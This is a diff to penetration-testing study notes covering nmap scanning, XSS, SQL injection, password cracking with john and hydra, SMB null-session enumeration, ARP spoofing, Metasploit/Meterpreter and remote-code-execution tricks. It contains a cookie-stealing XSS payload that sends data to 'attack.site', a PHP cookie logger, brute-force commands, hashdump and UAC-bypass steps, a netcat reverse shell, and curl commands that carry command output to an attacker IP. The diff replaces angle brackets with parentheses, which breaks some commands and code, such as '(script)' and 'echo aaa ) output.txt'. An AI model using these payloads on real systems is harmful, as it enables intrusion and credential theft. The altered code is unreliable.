@@ -34,7 +34,7 @@
 
 - Virtual private network
 - Uses cryptography to extend private network over a public network
-  - Client --(VPN)--> Internet --> Private network
+  - Client --(VPN)--) Internet --) Private network
 
 ### 1.4 Binary Arithmethic Codes
 
@@ -152,7 +152,7 @@
 
 - Several representations:
   1. **Regular form:** 1080:0:FF:0:8:800:200C:417A
-  2. **Compressed form:** FF01:0:0:0:0:0:0:43 --> FF91::43
+  2. **Compressed form:** FF01:0:0:0:0:0:0:43 --) FF91::43
 
 - Also has reserverd addresses
 - Can be split in half into network part and a device part
@@ -507,7 +507,7 @@
 ### 4.1 Important Windows Commands
 
 - **Output redirection:**
-  - echo aaa > output.txt
+  - echo aaa ) output.txt
 
 - **Execute two commands regardless of eachother:**
   - [Command1] & [Command2]
@@ -617,9 +617,9 @@
   - OS fingerprinting
   - Determining which OS the host is running
   - Sends a series of specifically crafted requests to hosts and examines every bit to find OS signatures
-    - *nmap -Pn -O <target(s)>*
+    - *nmap -Pn -O (target(s))*
   - Limit to promising hosts
-    - *nmap -O --osscan-limit <targets>*
+    - *nmap -O --osscan-limit (targets)*
 
 ### 6.5 nmap Port Scan
 
@@ -648,6 +648,7 @@
   - **-sV** - version detection scan
     - Reads the banner from the daemon on the port
   - **-p** - Specifies port range
+  - **-A** - Scans everything
 
 - Scan targets can be specified with
   - DNS names
@@ -792,7 +793,7 @@
   Content-type: text/html
   Content-length: 20
 
-  <?php phpinfo(); ?>
+  (?php phpinfo(); ?)
   ```
 
 - After uploading the file, pass arguments to the file via cmd GET parameter
@@ -830,7 +831,7 @@
 
   1. Look at every user input and test if it is somehow displayed to the output of the site(reflection point)
   2. Check if it possible to inject HTML code and if it ouputs
-      - Try HTML tags < >
+      - Try HTML tags ( )
 
 #### 8.5.2 Reflected XSS
 
@@ -844,23 +845,23 @@
 - Most common attacks are from HTLM post forms
 - Examples
   - Display cookie with
-    - `<script> alert(document.cookie)</script>`
+    - `(script) alert(document.cookie)(/script)`
   - Send cookie to attacker-controlled site
 
     - ```javascript
-      <script>
+      (script)
       var i = new Image();
       i.src="http://attack.site/log.php?q="+document.cookie;
       ```
 
     - ```php
-      <?php
+      (?php
       $filename="/tmp/log.txt";
       $fp=fopen($filname, 'a');
       $cookie=$_GET['q'];
       fwrite($fp, $cookie);
       fclose($fp);
-      ?>  
+      ?)  
       ```
 
 - Hack.me to test yourself
@@ -873,14 +874,14 @@
 - SQL syntax
   
   - ```sql
-    SELECT <columns list>, FROM <table> WHERE <condition>;
+    SELECT (columns list), FROM (table) WHERE (condition);
     ```
 
 - Union command
   - Performs union between two results
   
   - ```sql
-    <SELECT statement> UNION <other SELECT statement>;
+    (SELECT statement) UNION (other SELECT statement);
     ```
 
 - Comments in SQL
@@ -974,7 +975,7 @@
   - Find database banner
 - **--tables**
   - Find database tables
-- **--current-db <database>**
+- **--current-db (database)**
   - Find information from a specific database
 - **--columns**
   - Find columns in database
@@ -996,21 +997,21 @@
   - **--list=formats**
 - Needs passwords and usernames to be in the same file
   - Use *unshadow* tool to place in same file
-  - **unshadow plaintext.txt hashes.txt > crackme**
+  - **unshadow plaintext.txt hashes.txt ) crackme**
 
 - Brute force attack
-  - **john -incremental -users:<users list> <file to crack>**
+  - **john -incremental -users:(users list) (file to crack)**
 - Brute force a single user
   - **john -incremental -user:victim crackme**
 - Display passwords recovered
   - **--show**
 
 - Run john with a dictionairy
-  - **john --wordlist<=custom wordlist file> <file to crack>**
+  - **john --wordlist(=custom wordlist file) (file to crack)**
 
 - Mangling with john
   - Try different common variations of passwords
-  - **john --wordlist<=custom wordlist file> -rules <file to crack>**
+  - **john --wordlist(=custom wordlist file) -rules (file to crack)**
 
 #### 9.1.3 Hashcat
 
@@ -1067,7 +1068,7 @@
 - Can use brute force or dictionairy attacks to authenticate on web servers
 
 - Dictionairy attack
-  - **hydra -L users.txt -P pass.txt <service://server> <options>**
+  - **hydra -L users.txt -P pass.txt (service://server) (options)**
 
 - **-p** or **-P**
   - Try given password(s) string(s) or from file
@@ -1087,7 +1088,7 @@
   - Verbosity
 
 - **http-post-forms**
-  - **hydra <1> http-post-form "/login.php:<2>^USER^& <3>=^PASS^:<4>**
+  - **hydra (1) http-post-form "/login.php:(2)^USER^& (3)=^PASS^:(4)**
     1. Login site
     2. HTML POST user parameter
     3. HTML POST password parameter
@@ -1096,10 +1097,10 @@
       - **hydra hack.this http-post-form "/login.php:usr^USER^&pwd=^PASS^:invalid credentials -L /usr/share/ncrack/minimal.usr -P /usr/share/seclist/Passwords/rock-you-15.txt -f -V**
 
 - telnet attack
-  - **hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rock-you-10.txt  telnet://<address>**
+  - **hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rock-you-10.txt  telnet://(address)**
 
 - SSH attack
-  - **hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rock-you-10.txt  <address> ssh**
+  - **hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rock-you-10.txt  (address) ssh**
   - Once in, download files with
     - **scp username@hostname:/path/to/remote/file /path/to/local/file**
     - Important unix files
@@ -1169,54 +1170,245 @@
 #### 10.3.1 Enumerating Windows Shares on Windows
 
 - **nbtstat**
-  - **nbtstat -A <IP>**
+  - **nbtstat -A (IP)**
     - Displays info about a target
-    - <00> = Computer is workstation
+    - (00) = Computer is workstation
     - UNIQUE = Computer has only one IP
-    - <20> = File sharing is running on the machine
+    - (20) = File sharing is running on the machine
 
 - **NET VIEW**
   - Once the attacker knows the machine is running the File server service
-  - **NET VIEW <TARGET IP>**
+  - **NET VIEW (TARGET IP)**
 
 ### 10.3.2 Checking for Null Sessions on Windows
 
 - Once found File and Printer Sharing service
-- Example
-  - Exploit IPC$ administrative share
-  - **NET USE \\<target IP address>\IPC$ '' /u: ''**
+- Exploit IPC$ administrative share
+  - **NET USE \\(target IP address)\IPC$ '' /u: ''**
     - Conect with empty password and username
 
 #### 10.3.3 Exploiting Null Sessions on Windows
 
 - **enum**
-  - **enum -S <target IP>**
+  - **enum -S (target IP)**
     - **-S** = Enumerate shares on machine
     - **-U** = Enumerate users
     - **-P** = Check password policy
       - Can help with brute forcing and false positives
 
 - **winfo**
-  - **winfo <target IP> -n**
+  - **winfo (target IP) -n**
     - **-n** = Tell the tool to use null sessions
 
 #### 10.3.4 Enumerating Windows Shares on Linux
 
 - **nmblookup**
-  - **nmblookup -A <target ip address>**
+  - **nmblookup -A (target ip address)**
 
 - **smbclient**
   - FTP-like client to access windows shares
   - Can also enumerate
-  - **smbclient -L //<target ip> -N**
+  - **smbclient -L //(target ip) -N**
     - **-L** = Lookes up what services are available on the target
     - **-N** = Forces the tool to not ask for password
 
 #### 10.3.5 Checking for Null Sessions on Linux
 
-- **smbclient //<target ip>/<target share> -N**
+- **smbclient //(target ip)/(target share) -N**
 
-#### 10.3.6 Exploiting Null Sessions on Linux
+#### 10.3.6 Check Null Sessions with Nmap
+
+- **nmap script=smb-enum-shares (target IP)**
+  - Gather information about shares
+- **nmap script=smb-enum-users (target IP)**
+  - Gather information about users on the network
+- **nmap script smb-check-vulns.nse script-args=unsafe=1 (target IP)**
+  - Is SMB server vulnerable to known smb vulnerabilities
+
+#### 10.3.7 Exploiting Null Sessions on Linux
 
 - **enum4linux**
   - Same operations as enum dn winfo, but more features
+  - **enum4linux (options) (target IP)**
+    - **-S** = Enumerate shares on machine
+    - **-s /usr/share/enum4linux/share-list.txt** = Brute force shares on a machine
+    - **-U** = Enumerate users
+    - **-P** = Check password policy
+    - **-G** = Get group information
+    - **-a** = Run all commands
+
+#### 10.3.8 Samrdump
+
+- **/usr/share/doc/python-impacket-doc/examples/samrdump.py**
+- **samrdump.py (targetIP)**
+- Gather user information(password complexity, UID's, log on date, etc)
+
+#### 10.3.9 Nmap smb Brute Force
+
+- **nmap script=smb-brute (target IP)**
+  - Attempt to brute force user credentials to smb users
+
+### 10.4 ARP Poisoning
+
+- MITM attack
+- Manipulates hosts ARP cache
+- Manipulates by sending gratuitous ARP replies
+  - Attacker sends reply without waiting for any hosts to make a request
+  - Tells other nodes to reach the victims IP at the attackers MAC
+  - Prevents the expiring for the poisoned entry by sending a reply every 30 seconds or so
+
+#### 10.4.1 Arpspoof
+
+- **echo 1 > /proc/sys/net/ipv4/ip_forward**
+  - Forwards packets intercepted to real destination
+
+- **arpspoof -i (interface) -t (target) -r (host)**
+  - **-i** is NIC(e.g eth0, tap0, etc..)
+  - **-t** targets IP
+  - **-r** web servers IP
+  - Then run wireshark to intercept traffic
+
+### 10.5 Metasploit
+
+- **service postgresql start**
+  - Makes msf search faster
+- **service metasploit start**
+- **msfconsole**
+- **search (string)**
+  - Search the metasploit database
+- **show (string)**
+  - Can be used to show
+    - Exploits
+    - Available payloads when an exploit is selected
+    - Options
+- **use /path/to/exploit(or payload)**
+  - Select exploit or payload to use
+- **back**
+  - Go back to msfconsole prompt  
+- **info (string)**
+  - Get info on exploit/payload
+- **set (option)(value)**
+  - Set an option parameter for an exploit or payload
+- **msfupdate**
+  - Updates metasploit
+- **options**
+  - RHOST = IP to target machine
+  - LHOST = Localhost IP to the machine of the attacker
+  - LPORT = Port on the attackers machine
+
+- **Example of use**
+  - ARP scan
+  - Port scan
+
+### 10.6 Meterpreter
+
+- Attacking shell
+- Connections
+  - **reverse-tcp**
+    - Performs TCP connection back to attackers machine
+    - Could evade firewalls
+  - **bind-tcp**
+    - Runs a server process on the victims machine waiting for a connection from an attacker
+
+- MSFConsole can host multiple Meterpreter sessions
+- **background**
+  - Switches from the session back to msfconsole
+- **sessions -l**
+  - List opened sessions
+- **sessions -i (session ID)**
+  - Resume a session
+- **sysinfo**
+  - Gives information about the victims machine
+- **ifconfig**
+  - Prints network config
+- **route**
+  - Shows routing information
+- **getuid**
+  - Gives info on the user running the exploited process
+- **shell**
+  - Run an OS shell
+
+- Explore the victims machine with Unux-like shell commands
+  - eg pwd, ls, cd etc...
+  - Remember to escape backslashes when escaping
+    - **cd C:\\**
+
+#### 10.6.1 Priviledge Escalation in Meterpreter
+
+- **getsystem**
+  - Runs a priviledge escalation routine
+
+- If Windows system is fairly modern, the User Account Policy has to be bypassed
+  - use **bypassuac**
+    - Search msfconsole and select the meterpreter session to apply the exploit to
+  - If all goes according to plan, the **getsystem** command should now work
+
+#### 10.6.2 Password Dumping in Meterpreter
+
+1. Use **hashdump** module
+2. Select session
+3. Exploit!
+
+#### 10.6.3 Uploading and Downloading Files in Meterpreter
+
+- **upload (file) (path)**
+- **download (file) (path)**
+
+## 11 RCE Tips and Tricks
+
+### 11.1 Blind Injections
+
+- When encoutering blind inputs where its not clear if the input changes server behaviour
+
+- Try sleep commands
+  - Check burp suite response time from server if it changes depending on the input
+  - **sleep+(time)**
+  
+- Try pinging the server from Burp
+  - **ping (localhost) -c (n of pings)**
+  - Mark command -> *convert selection* -> *URL* -> *URL Encode All Characters*
+  - Capture data with wireshark and check if server is pinging localhost
+
+### 11.2 After Uploading a Simple Non-Interactive PHP Shell
+
+#### 11.2.1 Identify constraints
+
+- Check available tools on the web server
+- Upload our own tools
+- **Check $PATH**
+  - echo $PATH
+  - **ls /path/files**
+  - **which (tool)**
+    - nc?
+    - python or other languages installed?
+    - curl or wget?
+
+#### 11.2.2 Trying to Spawn Bash on Connection
+
+- **nc -lvp 53**
+  - Netcat server on localost port 53
+
+- On web server
+  - **nc (localhost port of attackers nc server):(port) -e /bin/bash**
+  - Often dissapointing to rely on netcat, try curl
+
+- Abusing *curl* to get RCE
+  - set up netcat listener
+  - Curl the attackers server form webserver
+
+    - ```bash
+      curl http://(attacker lhost IP):(nc port)/`whoami`
+
+    - Check HTTP request from server
+      - If the request is sendt from a remote server(e.g /www-data), a blind code injection vulnerability might be present
+      - Could be the only way to get output from underlying commands being executed
+  - Encode data from server
+    - When requests are not displaying the commands in a usefull way
+      - e.g output is (UID=33)/www-data
+    - **Try base64**
+
+      - ```bash
+        curl http://(attacker IP)(nc port)/`id` | base64
+
+    - Decode it
+      - echo (encoded string) | base64 -d
